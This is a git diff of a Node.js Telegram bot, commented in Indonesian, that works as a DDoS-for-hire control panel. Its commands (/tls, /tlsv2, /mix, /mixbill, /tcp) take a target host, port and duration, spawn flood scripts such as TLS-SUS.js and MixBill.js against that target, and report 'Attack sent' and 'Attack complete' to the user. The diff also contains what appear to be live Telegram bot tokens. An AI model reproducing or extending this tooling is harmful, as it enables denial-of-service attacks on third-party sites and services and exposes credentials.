@@ -3,7 +3,7 @@ const axios = require('axios');
 const { spawn } = require('child_process');
 
 // Ganti 'YOUR_BOT_TOKEN' dengan token bot Anda
-const bot = new TelegramBot('7208627213:AAF-_3BbPnN_IIALIZY2PdkAOyIieEJ8r_E', { polling: true });
+const bot = new TelegramBot('6408477172:AAG_ktoPlbP_eni9r6WVKkoPcYsOglBoxp4', { polling: true });
 
 // Fungsi untuk mendapatkan waktu dalam format tertentu
 function getCurrentTime() {
@@ -17,14 +17,14 @@ function getCurrentTime() {
 // Tanggapi pesan
 bot.onText(/\/methods/, (msg) => {
   const chatId = msg.chat.id;
-  const message = "Menu Methods📑\r\n\r\n📍Layer 7\r\n/bokep [HOST] [PORT] [TIME]\r\n/tlsv2 [HOST] [PORT] [TIME]\r\n/TlsCiko [HOST] [PORT] [TIME]\r\n\r\n📍Layer 4\r\n/tcp [IP] [PORT] [TIME]\r\n\r\nTIME=60-130 | PORT 9-443";
+  const message = "Menu Methods💫\r\n\r\n📍Layer 7\r\n/mix [HOST] [PORT] [TIME]\r\n/tlsv2 [HOST] [PORT] [TIME]\r\n/tls [HOST] [PORT] [TIME]\r\n/mixbill [HOST] [PORT] [TIME]\r\n\r\n📍Layer 4\r\n/tcp [IP] [PORT] [TIME]\r\n\r\nTIME=60-130 | PORT 9-443";
   bot.sendMessage(chatId, message);
 });
 
 // Tanggapi pesan
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
-  const message = "Welcome to Bot LoliChan😋\r\n\r\nMENU BOT📑\r\n/methods | to see all methods\r\n\/check_host | coming soon\r\n/ipinfo | to view information via IP address\r\n/dstat | see Requests per second \r\n\r\nOwner : @Erorr37cs";
+  const message = "Welcome to Bot hoshino😋\r\n\r\nMENU BOT hoshino📑\r\n/methods | to see all methods\r\n\/check_host | coming soon\r\n/ipinfo | to view information via IP address\r\n/dstat | see Requests per second \r\n\r\nOwner : @Erorr37cs";
   bot.sendMessage(chatId, message);
 });
 
@@ -35,8 +35,8 @@ bot.onText(/\/ongoing/, (msg) => {
   bot.sendMessage(chatId, message);
 });
 
-// methods tlsvCiko
-bot.onText(/\/TlsCiko (.+)/, (msg, match) => {
+// methods https2
+bot.onText(/\/mixbill (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const username = msg.chat.username;
   const time = getCurrentTime();
@@ -47,7 +47,7 @@ bot.onText(/\/TlsCiko (.+)/, (msg, match) => {
   const req = args[2];
   const timeArg = args[1];
 
-const browserProcess = spawn('node', ['TLS-SUS.js', url, req, timeArg, 15,], { cwd: __dirname });
+const browserProcess = spawn('node', ['MixBill.js', url, req, timeArg, 14,], { cwd: __dirname });
 
 // Tangani output dari child process
   browserProcess.stdout.on('data', (data) => {
@@ -64,7 +64,41 @@ const browserProcess = spawn('node', ['TLS-SUS.js', url, req, timeArg, 15,], { c
 // Tangani selesainya child process
   browserProcess.on('close', (code) => {
     console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
-    bot.sendMessage(chatId, `✅Attack selesai!! `);
+    bot.sendMessage(chatId, `✅Attack complete!! ${code}`);
+  });
+});
+
+
+// methods tls
+bot.onText(/\/tls (.+)/, (msg, match) => {
+  const chatId = msg.chat.id;
+  const username = msg.chat.username;
+  const time = getCurrentTime();
+  console.log('\x1b[36m%s\x1b[0m', `${time} - ${username} menggunakan bot dengan command /attack`);
+
+  const args = match[1].split(' '); // Memisahkan argumen
+  const url = args[0];
+  const req = args[2];
+  const timeArg = args[1];
+
+const browserProcess = spawn('node', ['TLS-SUS.js', url, req, timeArg, 14,], { cwd: __dirname });
+
+// Tangani output dari child process
+  browserProcess.stdout.on('data', (data) => {
+    console.log('\x1b[33m%s\x1b[0m', `${time} - ${username} - stdout: ${data}`);
+    bot.sendMessage(chatId, `🟢Attack sent!!🟢${data}`);
+  });
+
+// Tangani error dari child process
+  browserProcess.stderr.on('data', (data) => {
+    console.error('\x1b[31m%s\x1b[0m', `${time} - ${username} - stderr: ${data}`);
+    bot.sendMessage(chatId, `stderr: ${data}`);
+  });
+
+// Tangani selesainya child process
+  browserProcess.on('close', (code) => {
+    console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
+    bot.sendMessage(chatId, `✅Attack complete!! `);
   });
 });
 
@@ -98,7 +132,7 @@ bot.onText(/\/tlsv2 (.+)/, (msg, match) => {
 // Tangani selesainya child process
   browserProcess.on('close', (code) => {
     console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
-    bot.sendMessage(chatId, `✅Attack selesai!! `);
+    bot.sendMessage(chatId, `✅Attack complete!! `);
   });
 });
 
@@ -131,12 +165,12 @@ bot.onText(/\/tcp (.+)/, (msg, match) => {
 // Tangani selesainya child process
   browserProcess.on('close', (code) => {
     console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
-    bot.sendMessage(chatId, `✅Attack selesai! `);
+    bot.sendMessage(chatId, `✅Attack complete!! `);
   });
 });
 
 // methods bokep
-bot.onText(/\/bokep (.+)/, (msg, match) => {
+bot.onText(/\/mix (.+)/, (msg, match) => {
   const chatId = msg.chat.id;
   const username = msg.chat.username;
   const time = getCurrentTime();
@@ -165,7 +199,7 @@ bot.onText(/\/bokep (.+)/, (msg, match) => {
   // Tangani selesainya child process
   browserProcess.on('close', (code) => {
     console.log('\x1b[32m%s\x1b[0m', `${time} - ${username} - child process exited with code ${code}`);
-    bot.sendMessage(chatId, `✅Attack selesai! ${code}`);
+    bot.sendMessage(chatId, `✅Attack complete!! ${code}`);
   });
 });
 
